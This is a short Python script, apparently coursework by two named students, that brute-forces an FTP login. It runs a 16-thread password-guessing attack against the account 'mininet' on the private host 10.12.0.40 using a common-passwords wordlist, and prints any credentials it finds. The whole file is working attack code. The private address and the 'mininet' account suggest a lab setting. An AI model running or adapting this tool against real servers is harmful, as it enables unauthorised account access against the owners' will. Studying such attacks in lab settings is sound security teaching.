"""
Luyckx Marco 496283
Bouhnine Ayoub 500048

Brute-forcing FTP

This script will try to brute-force the FTP server with a username and a given wordlist. For more information, see the README.md file.

Usage : python3 main.py
"""

import sys
import os
import time
import ftplib
import concurrent.futures


def ftp_login(host, username, password):
    """
    Try to login to the FTP server with the given credentials
    """
    try:
        with ftplib.FTP(host) as ftp:
            ftp.login(username, password)
            print(f"Found Password : {password} for account : {username}")
            return True
    except:
        return False


if __name__ == '__main__':
    host = "10.12.0.40"
    username = "mininet"
    wordlist = "10k-most-common.txt"

    if not os.path.exists(wordlist):
        print("\nPlease move the file '10k-most-common.txt' into the correct directory")
        sys.exit(1)

    print(f'Starting threaded FTP bruteforce on {host} with account: {username}')
    start_time = time.time()

    with open(wordlist, 'r') as f:
        passwords = f.readlines()

        with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
            futures = []
            for password in passwords:
                password = password.strip()
                print(f"Trying Login : {password}")
                futures.append(executor.submit(
                    ftp_login, host, username, password))

            for future in concurrent.futures.as_completed(futures):
                if future.result():
                    executor.shutdown(wait=False)
                    print(f"Time taken : {time.time() - start_time}s")
                    sys.exit(0)

    print('Password not found')
    print(f"Time taken : {time.time() - start_time}s")
